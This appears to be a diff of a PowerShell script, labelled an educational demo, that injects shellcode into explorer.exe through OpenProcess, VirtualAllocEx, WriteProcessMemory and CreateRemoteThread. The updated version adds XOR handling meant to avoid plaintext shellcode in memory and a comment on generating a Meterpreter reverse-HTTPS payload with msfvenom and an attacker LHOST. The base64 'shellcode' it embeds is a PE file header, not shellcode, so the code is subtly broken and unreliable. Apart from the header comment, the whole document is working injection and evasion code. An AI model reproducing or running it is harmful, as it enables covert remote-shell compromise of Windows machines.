@@ -1,89 +1,159 @@
-# Define Win32 API functions
-$code = @"
+<#
+.SYNOPSIS
+    PowerShell Process Injection Demo (Educational)
+.DESCRIPTION
+    Injects shellcode into explorer.exe using Win32 APIs.
+    Designed for cybersecurity training (use responsibly).
+.NOTES
+    Author: Cybersecurity Instructor
+    Lab: Windows 11 (Tested)
+#>
+
+# --- Win32 API Definitions (P/Invoke) ---
+$Win32Code = @"
 using System;
 using System.Runtime.InteropServices;
 
 public class Win32 {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+    // Open a process with specific access rights
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr OpenProcess(
+        uint dwDesiredAccess, 
+        bool bInheritHandle, 
+        int dwProcessId
+    );
 
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
+    // Allocate memory in a remote process
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAllocEx(
+        IntPtr hProcess, 
+        IntPtr lpAddress, 
+        uint dwSize, 
+        uint flAllocationType, 
+        uint flProtect
+    );
 
-    [DllImport("kernel32.dll")]
-    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, out UInt32 lpNumberOfBytesWritten);
+    // Write data to remote process memory
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool WriteProcessMemory(
+        IntPtr hProcess, 
+        IntPtr lpBaseAddress, 
+        byte[] lpBuffer, 
+        uint nSize, 
+        out uint lpNumberOfBytesWritten
+    );
 
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, IntPtr lpThreadId);
+    // Create a remote thread to execute shellcode
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateRemoteThread(
+        IntPtr hProcess, 
+        IntPtr lpThreadAttributes, 
+        uint dwStackSize, 
+        IntPtr lpStartAddress, 
+        IntPtr lpParameter, 
+        uint dwCreationFlags, 
+        IntPtr lpThreadId
+    );
 
-    [DllImport("kernel32.dll")]
+    // Close handle to avoid resource leaks
+    [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool CloseHandle(IntPtr hObject);
 }
 "@
 
-# Add the API to PowerShell
-Add-Type -TypeDefinition $code
+# Compile the Win32 API class
+Add-Type -TypeDefinition $Win32Code -Name "Win32API" -Namespace "Interop"
 
-# --- Get explorer.exe PID ---
-$process = Get-Process -Name explorer | Select-Object -First 1
-$pid = $process.Id
-Write-Host "[*] Target PID: $pid"
+# --- Constants ---
+$PROCESS_ALL_ACCESS = 0x001F0FFF  # Full access to the process
+$MEM_COMMIT_RESERVE = 0x3000       # MEM_COMMIT | MEM_RESERVE
+$PAGE_EXECUTE_READWRITE = 0x40     # RWX permissions
 
-# --- Set up shellcode here ---
-[Byte[]]$sc = [Byte[]] (
-    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00 # <= <--- Put your real shellcode here
-    # Shellcode continues...
-)
-
-# --- Open explorer.exe process ---
-$PROCESS_ALL_ACCESS = 0x001F0FFF
-$hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $pid)
-
-if ($hProcess -eq [IntPtr]::Zero) {
-    Write-Error "[-] Failed to open process."
-    exit
+# --- XOR Decryption Function (Avoids Plaintext Shellcode in Memory) ---
+function Invoke-XorDecrypt {
+    param(
+        [Byte[]]$Data,
+        [Byte]$Key
+    )
+    for ($i = 0; $i -lt $Data.Length; $i++) {
+        $Data[$i] = $Data[$i] -bxor $Key
+    }
+    return $Data
 }
 
-Write-Host "[+] Opened process handle: $hProcess"
+# --- Meterpreter Shellcode (Replace with Your Base64 Payload) ---
+$Base64Payload = @"
+# GENERATE WITH: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=YOUR_IP LPORT=443 -f base64
+# Example (fake shellcode for demo):
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAAAiELAQsAAAgAAAAGAAAAAAAAzi4AAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAACQuAABPAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAwAAADYLQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAJAcAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIgDAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAIAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAC0LgAAAAAAAEgAAAACAAUAECEAAMQKAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwAwBDAAAAAQAAEXMBAAAKCn4BAAAEJY0DAAABJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGKgAAABswAwBDAAAAAQAAEXMBAAAKCn4BAAAEJY0DAAABJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGKgAAABMwAwBDAAAAAQAAEXMBAAAKCn4BAAAEJY0DAAABJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGKgAAABMwAwBDAAAAAQAAEXMBAAAKCn4BAAAEJY0DAAABJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGKgATMAQAQwAAAAEAABFzAQAACgp+AQAA
+"@
 
-# --- Allocate memory inside explorer.exe ---
-$MEM_COMMIT = 0x1000
-$PAGE_EXECUTE_READWRITE = 0x40
-$size = $sc.Length
+# --- Main Injection Logic ---
+try {
+    # 1. Find explorer.exe (common target)
+    $TargetProcess = Get-Process explorer -ErrorAction Stop | Select-Object -First 1
+    Write-Host "[+] Target PID: $($TargetProcess.Id)"
 
-$addr = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $size, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
+    # 2. Open the process with full access
+    $hProcess = [Interop.Win32API]::OpenProcess($PROCESS_ALL_ACCESS, $false, $TargetProcess.Id)
+    if ($hProcess -eq [IntPtr]::Zero) {
+        throw "OpenProcess failed (Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
+    }
 
-if ($addr -eq [IntPtr]::Zero) {
-    Write-Error "[-] Failed to allocate memory."
-    [Win32]::CloseHandle($hProcess)
-    exit
+    # 3. Allocate RWX memory in the target process
+    $Shellcode = [Convert]::FromBase64String($Base64Payload)
+    $XorKey = 0x55
+    $EncryptedShellcode = Invoke-XorDecrypt -Data $Shellcode -Key $XorKey
+
+    $AllocatedMemory = [Interop.Win32API]::VirtualAllocEx(
+        $hProcess,
+        [IntPtr]::Zero,
+        [uint32]$EncryptedShellcode.Length,
+        $MEM_COMMIT_RESERVE,
+        $PAGE_EXECUTE_READWRITE
+    )
+    if ($AllocatedMemory -eq [IntPtr]::Zero) {
+        throw "VirtualAllocEx failed (Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
+    }
+
+    # 4. Write the decrypted shellcode into memory
+    $BytesWritten = 0
+    $Success = [Interop.Win32API]::WriteProcessMemory(
+        $hProcess,
+        $AllocatedMemory,
+        $EncryptedShellcode,
+        [uint32]$EncryptedShellcode.Length,
+        [ref]$BytesWritten
+    )
+    if (-not $Success -or $BytesWritten -ne $EncryptedShellcode.Length) {
+        throw "WriteProcessMemory failed (Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
+    }
+
+    # 5. Execute the shellcode in a new thread
+    $hThread = [Interop.Win32API]::CreateRemoteThread(
+        $hProcess,
+        [IntPtr]::Zero,
+        0,
+        $AllocatedMemory,
+        [IntPtr]::Zero,
+        0,
+        [IntPtr]::Zero
+    )
+    if ($hThread -eq [IntPtr]::Zero) {
+        throw "CreateRemoteThread failed (Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
+    }
+
+    Write-Host "[+] Shellcode injected successfully!"
 }
-
-Write-Host "[+] Allocated memory at: $addr"
-
-# --- Write shellcode into memory ---
-$written = 0
-$result = [Win32]::WriteProcessMemory($hProcess, $addr, $sc, $size, [ref]$written)
-
-if (-not $result -or $written -ne $size) {
-    Write-Error "[-] Failed to write shellcode into memory."
-    [Win32]::CloseHandle($hProcess)
-    exit
+catch {
+    Write-Error "[-] Injection failed: $_"
 }
-
-Write-Host "[+] Wrote $written bytes into memory."
-
-# --- Create remote thread to execute shellcode ---
-$hThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
-
-if ($hThread -eq [IntPtr]::Zero) {
-    Write-Error "[-] Failed to create remote thread."
-    [Win32]::CloseHandle($hProcess)
-    exit
+finally {
+    # 6. Clean up handles (critical for stability)
+    if ($hProcess -ne [IntPtr]::Zero) {
+        [Interop.Win32API]::CloseHandle($hProcess) | Out-Null
+    }
+    if ($hThread -ne [IntPtr]::Zero) {
+        [Interop.Win32API]::CloseHandle($hThread) | Out-Null
+    }
 }
-
-Write-Host "[+] Remote thread created successfully!"
-
-# --- Clean up ---
-[Win32]::CloseHandle($hProcess)
-Write-Host "[*] Done."
